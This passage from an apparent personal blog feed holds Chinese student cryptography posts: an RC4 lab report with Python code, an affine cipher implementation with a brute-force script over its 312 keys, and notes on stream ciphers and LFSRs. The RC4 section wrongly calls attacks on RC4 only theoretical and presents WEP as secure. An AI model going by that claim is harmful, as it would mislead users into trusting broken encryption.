class="string">"""初始化S,T"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">s1.append(i)</span><br><span class="line">t1.append(k1[i%len(k1)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_s</span><span class="params">(s2,t2)</span>:</span></span><br><span class="line"><span class="string">"""更新S"""</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">j=(j+s2[i]+t2[i])%<span class="number">256</span></span><br><span class="line">s2[i],s2[j]=s2[j],s2[i]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret_flow</span><span class="params">(s3,p1,flow1)</span>:</span></span><br><span class="line"><span class="string">"""生成密钥流"""</span>  </span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(len(p1)):</span><br><span class="line">i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">j=(j+s3[i])%<span class="number">256</span></span><br><span class="line">s3[i],s3[j]=s3[j],s3[i]</span><br><span class="line">t=(s3[i]+s3[j])%<span class="number">256</span></span><br><span class="line">flow1.append(s3[t]) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plain_flow</span><span class="params">(p2,flow2,c)</span>:</span></span><br><span class="line"><span class="string">"""生成密文"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(p2)):</span><br><span class="line">temp=(flow2[i]^ord(p2[i]))</span><br><span class="line">temp1=hex(temp)</span><br><span class="line">c.append(temp1[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_rc4</span><span class="params">(c1,flow3,p_flow)</span>:</span></span><br><span class="line"><span class="string">"""解密"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c1)):</span><br><span class="line">temp2=int(<span class="string">"0x"</span>+c1[i],<span class="number">16</span>)</span><br><span class="line">p_flow.append(chr(flow3[i]^temp2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">print</span> <span class="number">8</span>*<span class="string">"*"</span>+<span class="string">"  Encrypt Input  "</span>+<span class="number">8</span>*<span class="string">"*"</span></span><br><span class="line">k=raw_input(<span class="string">"Please enter the key:"</span>)</span><br><span class="line">key=k.split(<span class="string">" "</span>)</span><br><span class="line">key=[int(key[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(key))]</span><br><span class="line">plain=raw_input(<span class="string">"Please enter the plain:"</span>)</span><br><span class="line">s=[] </span><br><span class="line">t=[] </span><br><span class="line">k_flow=[] </span><br><span class="line">c_flow=[]</span><br><span class="line">p_flow=[]</span><br><span class="line">init_S_T(s,t,key) </span><br><span class="line">update_s(s,t)</span><br><span class="line">secret_flow(s,plain,k_flow)</span><br><span class="line">plain_flow(plain,k_flow,c_flow)</span><br><span class="line"><span class="keyword">print</span> <span class="number">8</span>*<span class="string">"*"</span>+<span class="string">"  Encryption  "</span>+<span class="number">8</span>*<span class="string">"*"</span></span><br><span class="line"><span class="comment"># print("置乱后的s盒：")</span></span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line">print(<span class="string">"密钥流："</span>)</span><br><span class="line">print(k_flow)</span><br><span class="line">print(<span class="string">"Cipher:"</span>)</span><br><span class="line"><span class="comment"># print c_flow</span></span><br><span class="line"><span class="keyword">print</span><span class="string">""</span>.join(c_flow)   <span class="comment">#加密后输出密文</span></span><br><span class="line">decode_rc4(c_flow,k_flow,p_flow)          <span class="comment">#解密后输出明文</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n"</span>+<span class="number">8</span>*<span class="string">"*"</span>+<span class="string">"  Decryption  "</span>+<span class="number">8</span>*<span class="string">"*"</span></span><br><span class="line">print(<span class="string">"Plain:"</span>)</span><br><span class="line"><span class="keyword">print</span><span class="string">""</span>.join(p_flow)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h3 id="运行结果及正确性"><a href="#运行结果及正确性" class="headerlink" title="运行结果及正确性"></a>运行结果及正确性</h3><p>输入8个字符的明文化成ASCII码，再转化为比特流，与得到的密钥比特流进行逐位异或，结果化成16进制得到如下密文；将密文化为比特流再与原来的密钥流进行异或，得到明文比特流，继续转化为字符得到原来的字符hellocumt；所以算法正确性得到了验证；</p><p><img src="https://s2.ax1x.com/2019/01/02/FINa2F.png" alt="FINa2F.png"></p><h3 id="安全性分析"><a href="#安全性分析" class="headerlink" title="安全性分析"></a>安全性分析</h3><p>设计流密码的一个重要步骤就是设计密钥流生成器，主要安全要求就是：</p><p>1.密钥流的周期要足够大；</p><p>2.还要使得密钥流具有随机统计特性；</p><p>3.密钥流的部分暴露时，序列不可被推算出来，就是序列的线性不可预测性大；</p><p>一般来说，密钥序列的随机特性越好，加密的安全性也就越高；RC4的密钥生成随机特性良好，周期足够大；至今对RC4的攻击都停留在理论上，在实践上并不能对RC4构成威胁；</p><h3 id="有效性和合理性分析"><a href="#有效性和合理性分析" class="headerlink" title="有效性和合理性分析"></a>有效性和合理性分析</h3><p>由于RC4具有良好的随机特性和抵抗各种分析的能力，密钥流随机特性较好，因此在众多领域里RC4都得到了广泛的运用；例如：无线局域网标准的WEP协议就是利用RC4对数据进行加密，保障了无线通信信号的完整性和保密性，防止了不法分子对网络的非授权访问；这样的现实应用直接证实了RC4算法的有效性和合理性；</p><h3 id="算法编写过程中遇到的问题及解决"><a href="#算法编写过程中遇到的问题及解决" class="headerlink" title="算法编写过程中遇到的问题及解决"></a>算法编写过程中遇到的问题及解决</h3><p>编写过程中一开始解密不对，经过学习发现是一个简单的错误，那就是序列密码是对称加密算法，加密解密需要用到相同的密钥，所以每次如果明文和种子密钥不一样的话，解密都需要更新自己的密钥流；</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;RC4比较简单，放篇实验报告水一波(滑稽脸)
    
    </summary>
    
      <category term="Study" scheme="https://gardenia30.top/categories/Study/"/>
    
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>密码学课程设计之仿射加密</title>
    <link href="https://gardenia30.top/2019/01/13/%E4%BB%BF%E5%B0%84%E5%8A%A0%E5%AF%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://gardenia30.top/2019/01/13/仿射加密学习笔记/</id>
    <published>2019-01-13T11:11:51.000Z</published>
    <updated>2019-01-13T13:03:08.866Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>终于放假了，整理一波之前密码学的报告和笔记<a id="more"></a>；</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>仿射密码，是古典密码里面比较经典的替换密码，在我看来就是将移位密码和数乘密码结合到了一起；</p><p>加密方程：<code>C=(k1*M+k2)mod26</code>；</p><p>解密方程：<code>M=(C-k2)*(k1^-1)mod26</code>；</p><p>其中k1必须与26互素，这样才可以产生k1的逆元用于解密；没有对k1的限制，可能无法解密。</p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h3 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h3><p>这里的p为需要加密的明文，k1,k2就是上述的两个密钥，先看明文需要加密几个字母，有几个字母就产生几轮循环，每次循环将字母先转换为0~25的数字，然后进行数乘和移位变换，然后再转换为字符，存储在一个字符变量c中，直到循环结束为止，这就得到了密文；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#仿射加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fangshe</span><span class="params">(p,k1,k2)</span>:</span></span><br><span class="line">c=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(p)):</span><br><span class="line">temp=chr((((ord(p[i])-ord(<span class="string">'a'</span>))*k1+k2)%<span class="number">26</span>)+ord(<span class="string">'a'</span>))</span><br><span class="line">c+=temp</span><br><span class="line"><span class="keyword">return</span> c</span><br></pre></td></tr></table></figure><h3 id="判断最大公因数"><a href="#判断最大公因数" class="headerlink" title="判断最大公因数"></a>判断最大公因数</h3><p>如果需要解密，则必须要使得k1能够产生对26的逆元，即要使k1和26互素，所以判断k1和26是否最大公约数为1;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#判断最大公因数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(x,y)</span>:</span></span><br><span class="line"><span class="keyword">if</span> x&gt;y:</span><br><span class="line">temp=y</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">temp=x</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,temp+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span>((x%i==<span class="number">0</span>) <span class="keyword">and</span> (y%i==<span class="number">0</span>)):</span><br><span class="line">s=i</span><br><span class="line"><span class="keyword">return</span> s</span><br></pre></td></tr></table></figure><h3 id="解密算法"><a href="#解密算法" class="headerlink" title="解密算法"></a>解密算法</h3><p>解密首先要判断k1和26是否互素，互素才可以解密，在互素的前提下计算k1对于26的逆元：k1_re，然后用解密放生进行循环解密即可输出明文；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#仿射解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(a,b,str1)</span>:</span></span><br><span class="line">c1=<span class="string">""</span></span><br><span class="line"><span class="keyword">if</span>(gcd(a,<span class="number">26</span>)==<span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line"><span class="keyword">if</span>((a*i)%<span class="number">26</span>==<span class="number">1</span>):</span><br><span class="line">k1_re=i</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">temp=chr((((ord(str1[i])-ord(<span class="string">'a'</span>))-b)*k1_re)%<span class="number">26</span>+ord(<span class="string">'a'</span>))</span><br><span class="line">c1+=temp</span><br><span class="line"><span class="keyword">return</span> c1</span><br></pre></td></tr></table></figure><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><p>刚写python，比较丑……</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#仿射加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fangshe</span><span class="params">(p,k1,k2)</span>:</span></span><br><span class="line">c=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(p)):</span><br><span class="line">temp=chr((((ord(p[i])-ord(<span class="string">'a'</span>))*k1+k2)%<span class="number">26</span>)+ord(<span class="string">'a'</span>))</span><br><span class="line">c+=temp</span><br><span class="line"><span class="keyword">return</span> c</span><br><span class="line"><span class="comment">#判断最大公因数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(x,y)</span>:</span></span><br><span class="line"><span class="keyword">if</span> x&gt;y:</span><br><span class="line">temp=y</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">temp=x</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,temp+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span>((x%i==<span class="number">0</span>) <span class="keyword">and</span> (y%i==<span class="number">0</span>)):</span><br><span class="line">s=i</span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line"><span class="comment">#仿射解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(a,b,str1)</span>:</span></span><br><span class="line">c1=<span class="string">""</span></span><br><span class="line"><span class="keyword">if</span>(gcd(a,<span class="number">26</span>)==<span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line"><span class="keyword">if</span>((a*i)%<span class="number">26</span>==<span class="number">1</span>):</span><br><span class="line">k1_re=i</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">temp=chr((((ord(str1[i])-ord(<span class="string">'a'</span>))-b)*k1_re)%<span class="number">26</span>+ord(<span class="string">'a'</span>))</span><br><span class="line">c1+=temp</span><br><span class="line"><span class="keyword">return</span> c1</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">print</span> <span class="number">8</span>*<span class="string">"*"</span>+<span class="string">" EncryptInput "</span>+<span class="number">8</span>*<span class="string">"*"</span></span><br><span class="line">p=raw_input(<span class="string">"Please enter the plain:"</span>)</span><br><span class="line">k1=input(<span class="string">"Please enter k1:"</span>)</span><br><span class="line">k2=input(<span class="string">"Please enter k2:"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="number">8</span>*<span class="string">"*"</span>+<span class="string">" Encryption "</span>+<span class="number">8</span>*<span class="string">"*"</span></span><br><span class="line">c=fangshe(p,k1,k2)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Cipher:"</span>+c)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n"</span>+<span class="number">8</span>*<span class="string">"*"</span>+<span class="string">" DecryptInput "</span>+<span class="number">8</span>*<span class="string">"*"</span></span><br><span class="line">C=raw_input(<span class="string">"Please enter the Cipher:"</span>)</span><br><span class="line">key1=input(<span class="string">"Please enter k1:"</span>)</span><br><span class="line">key2=input(<span class="string">"Please enter k2:"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="number">8</span>*<span class="string">"*"</span>+<span class="string">" Decryption "</span>+<span class="number">8</span>*<span class="string">"*"</span></span><br><span class="line">plain=decode(key1,key2,C)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Plain:"</span>+plain</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="运行结果及正确性"><a href="#运行结果及正确性" class="headerlink" title="运行结果及正确性"></a>运行结果及正确性</h2><p>输入明文hellocumt，k1=7,k2=2加密所得的密文用仿射解密得出原来的明文，所以正确性得到验证</p><p><img src="https://s2.ax1x.com/2019/01/02/FIEyNt.png" alt="结果"></p><h2 id="安全性分析"><a href="#安全性分析" class="headerlink" title="安全性分析"></a>安全性分析</h2><p>1.仿射密码对于任意两个不同的字母，其最后得到的密文肯定不一样；所以当密文长度足够长时，我们可以使用频率分析的方法来解决。利用仿射密码时，一般只有 26 个字母，而不大于 26 的与 26 互素的个数一共有12个，算上偏移量，也就是大概12x26=312种可能性。</p><p>一般来说，对于该种密码，至少得是在已知部分明文的情况下才可以攻击。下面进行简单的分析。</p><p>已知部分明密文对：<code>y1=(ax1+b)mod26</code>     <code>y2=(ax2+b)(mod26)</code>   </p><p>两式相减：<code>y1−y2=a(x1−x2)(mod26)</code>很容易得到a，得到了a即可解出b</p><p>2.对密文直接用312个密钥空间进行暴破，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">plain=<span class="string">"zebbwqmif"</span></span><br><span class="line">c=<span class="string">""</span></span><br><span class="line">k=[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">21</span>,<span class="number">23</span>,<span class="number">25</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">c=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(len(plain)):</span><br><span class="line">res=chr((ord(plain[x])-ord(<span class="string">'a'</span>)-j)*k[i]%<span class="number">26</span>+ord(<span class="string">'a'</span>))</span><br><span class="line">c+=res</span><br><span class="line"><span class="keyword">print</span> c<span class="comment">#+'\n'</span></span><br><span class="line"><span class="keyword">if</span> c==<span class="string">"hellocumt"</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="number">8</span>*<span class="string">"*"</span>+<span class="string">"find it"</span>+<span class="number">8</span>*<span class="string">"*"</span></span><br></pre></td></tr></table></figure><p>运行结果：找到有意义的密文</p><p><img src="https://s2.ax1x.com/2019/01/13/FvvqPA.png" alt="FvvqPA.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;终于放假了，整理一波之前密码学的报告和笔记
    
    </summary>
    
      <category term="Study" scheme="https://gardenia30.top/categories/Study/"/>
    
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>序列密码学习笔记</title>
    <link href="https://gardenia30.top/2019/01/01/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0/"/>
    <id>https://gardenia30.top/2019/01/01/序列密码笔记/</id>
    <published>2019-01-01T09:10:17.000Z</published>
    <updated>2019-01-01T11:35:30.926Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2019年的第一天，继续加油鸭！<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="序列密码简单叙述"><a href="#序列密码简单叙述" class="headerlink" title="序列密码简单叙述"></a>序列密码简单叙述</h2><p>序列密码属于对称加密；它的加密用一个随机序列(密钥流)与明文序列按位加密产生密文，用同一随机序列与密文序列叠加来恢复明文序列密码为对称加密，一次只对明文消息的单个bit进行加密解密；一般密钥流的长度等于需要加密的密文的长度</p><p><a href="https://imgchr.com/i/F4zDhj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/01/F4zDhj.md.png" alt="F4zDhj.md.png"></a></p><p><strong>特点：</strong></p><ol><li><p>加解密运算只是简单的模二加（异或）运算</p></li><li><p>密码强度主要靠密钥流的随机性</p></li></ol><h2 id="序列密码加密解密过程"><a href="#序列密码加密解密过程" class="headerlink" title="序列密码加密解密过程"></a>序列密码加密解密过程</h2><p>1.密钥流产生于种子密钥，种子密钥K通过密钥流发生器产生密钥流<code>k=k0k1k2k3...kn-1</code></p><p>2.明文序列为<code>M=m0m1m2m3...m(n-1)</code></p><p>3.接下来就是K与M逐位异或得到C的序列<img src="https://s1.ax1x.com/2018/12/24/F6IdrF.png" alt="img"></p><p>4.解密不必多说，只要异或回去就好<img src="https://s1.ax1x.com/2018/12/24/F6Ifqe.png" alt="img"></p><p><strong>具体实现的流程图：</strong></p><p><img src="https://s1.ax1x.com/2018/12/24/F6IIIA.png" alt="img"></p><h2 id="序列密码的分类"><a href="#序列密码的分类" class="headerlink" title="序列密码的分类"></a>序列密码的分类</h2><h3 id="1-同步序列密码"><a href="#1-同步序列密码" class="headerlink" title="1.同步序列密码"></a>1.同步序列密码</h3><p>所谓同步序列密码指的是：密钥序列的产生独立于明文消息和密文消息；</p><p><strong>加密过程如下:</strong></p><p><img src="https://s1.ax1x.com/2018/12/24/F6TD91.png" alt="img"></p><p><code>f是状态函数，和密钥源产生必要得状态参数，g是产生密钥序列ki的函数，E是将ki与mi结合输出ci的函数</code></p><p><strong>模型：</strong></p><p><img src="https://s2.ax1x.com/2019/01/01/F4zC0U.png" alt="F4zC0U.png"><img src="https://s2.ax1x.com/2019/01/01/F4zP7F.png" alt="F4zP7F.png"></p><p><strong>特点：</strong></p><p>1.无错误传播：各符号之间真正独立。一个传播错误只影响一个符号，不会影响到后继的符号</p><p>2.同步：发送方和接收方必须保持精确的、用同样的密钥并作用在同样的位置上，才能正确的解密</p><h3 id="2-自同步序列密码"><a href="#2-自同步序列密码" class="headerlink" title="2.自同步序列密码"></a>2.自同步序列密码</h3><p>发双方中的任何一方，其密钥流的产生依赖于密文流；</p><p><strong>加密过程：</strong></p><p><a href="https://imgchr.com/i/F4zunK" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/01/F4zunK.md.png" alt="F4zunK.md.png"></a></p><p><strong>模型：</strong></p><p><img src="https://s2.ax1x.com/2019/01/01/F4zM7D.png" alt="加密.png"><img src="https://s2.ax1x.com/2019/01/01/F4zlAe.png" alt="解密.png"></p><p><strong>特点：</strong></p><p>1.有限错误传播：设密钥序列产生器具有n位存储，则一个符号的传输错误只影响到后面n符号的解密</p><p>2.自同步：只要接收方连续收到n个正确的密文符号，密钥序列产生器便会自动地恢复同步 </p><p>3.消除明文统计特性</p><h2 id="线性反馈移位寄存器"><a href="#线性反馈移位寄存器" class="headerlink" title="线性反馈移位寄存器"></a>线性反馈移位寄存器</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>1.可以产生具有良好伪随机性的序列如：m序列，所以在序列密码中作为密钥序列的驱动序列</p><p>2.一个线性反馈移位寄存器由两部分组成：<strong>移位寄存器+反馈函数</strong></p><h3 id="游程"><a href="#游程" class="headerlink" title="游程"></a>游程</h3><p>游程就是指连续的1或0序列，游程长度是指连续的1或0序列的长度；</p><h3 id="移位寄存器"><a href="#移位寄存器" class="headerlink" title="移位寄存器"></a>移位寄存器</h3><p>移位寄存器是指有n个寄存器（称为n级移位寄存器）<code>r1,r2,…,rn</code>从右到左排列，每个寄存器中能存放1位二进制数，所有寄存器中的数可以统一向右（或向左）移动1位，称为进动1拍。即<code>r1</code>的值<code>(b1)</code>右移1位后输出，然后<code>r2</code>的值<code>(b2)</code>送<code>r1</code> ,<code>r3</code>的值<code>(b3)</code>送<code>r2</code>,……最后，<code>rn</code>的值<code>(bn)</code>送<code>rn-1</code></p><p><img src="https://s2.ax1x.com/2019/01/01/F5FfMj.png" alt="F5FfMj.png"></p><h3 id="反馈移位寄存器-FSR"><a href="#反馈移位寄存器-FSR" class="headerlink" title="反馈移位寄存器(FSR)"></a>反馈移位寄存器(FSR)</h3><p>反馈移位寄存器(feedback shift register,FSR)是由n位的寄存器和反馈函数(feedback function)组成，n位的寄存器中的初始值称为移位寄存器的初态</p><p><img src="https://s2.ax1x.com/2019/01/01/F5F4Ln.png" alt="F5F4Ln.png"></p><h3 id="线性反馈移位寄存器（LFSR）"><a href="#线性反馈移位寄存器（LFSR）" class="headerlink" title="线性反馈移位寄存器（LFSR）"></a>线性反馈移位寄存器（LFSR）</h3><p>LFSR是一种特殊的FSR，其反馈函数是移位寄存器中某些位的异或，参与运算的这些位叫做<strong><em>抽头位</em></strong>；</p><p><strong>特征：</strong></p><p>1.n级LFSR的有效状态为<code>(2^n)-1</code>（全0状态除外，因全0状态的输出序列一直为全0），也即理论上能够产生周期为<code>(2^n)-1</code>的伪随机序列。但要产生最大周期的输出序列，抽头位有一定要求;</p><p>2.为了使LFSR得到最大的周期(2^n)-1，其生成多项式（由抽头序列加上常数1形成的多项式）要是本原多项式，这样生成的序列叫做m序列</p><p><strong>本原多项式：</strong></p><p><a href="https://imgchr.com/i/F5AoCT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/01/F5AoCT.md.png" alt="F5AoCT.md.png"></a><br><strong>加解密：</strong></p><p>一个LFSR可以生成足够长的密钥二进制序列加密明文二进制序列，要解密密文，只需要运行具有相同初始状态的LFSR即可。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;2019年的第一天，继续加油鸭！
    
    </summary>
    
      <category term="Study" scheme="https://gardenia30.top/categories/Study/"/>
    
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>The unforgettable 2018</title>
    <link href="https://gardenia30.top/2018/12/31/The-unforgettable-2018/"/>
    <id>https://gardenia30.top/2018/12/31/The-unforgettable-2018/</id>
    <published>2018-12-31T14:16:46.000Z</published>
    <updated>2019-01-01T14:12:16.192Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
      <category term="随笔" scheme="https://gardenia30.top/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>Java图形界面与多线程</title>
    <link href="https://gardenia30.top/2018/12/31/Java%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    <id>https://gardenia30.top/2018/12/31/Java图形界面与多线程/</id>
    <published>2018-12-31T12:28:51.000Z</published>
    <updated>2018-12-31T14:06:18.379Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Java上课都没认真听过，菜的一批……<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="加减乘除四则运算器"><a href="#加减乘除四则运算器" class="headerlink" title="加减乘除四则运算器"></a>加减乘除四则运算器</h2><p><strong>要求：</strong></p><p><img src="https://s1.ax1x.com/2018/12/31/F4BAu4.png" alt="F4BAu4.png"></p><p><strong>分析：</strong></p><p>1.创建类calculator继承JFrame；</p><p>2.在创建的calculator中添加所需要的各个组件：JButton，JTextfield；</p><p>3.在构造方法中对上述组件进行初始化然后进行添加，并且设置布局为流式布局，设置标题，框体参数；并且添加4个事件监听器；</p><p>4.具体用接口的方法实现4个事件监听器；</p><p>5.在主函数中new一个对象，调用setvisible()；</p><p>注意点：就是设计除法功能的时候需要注意一下输入输出都是double类型的数据</p><p><strong>源码如下：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 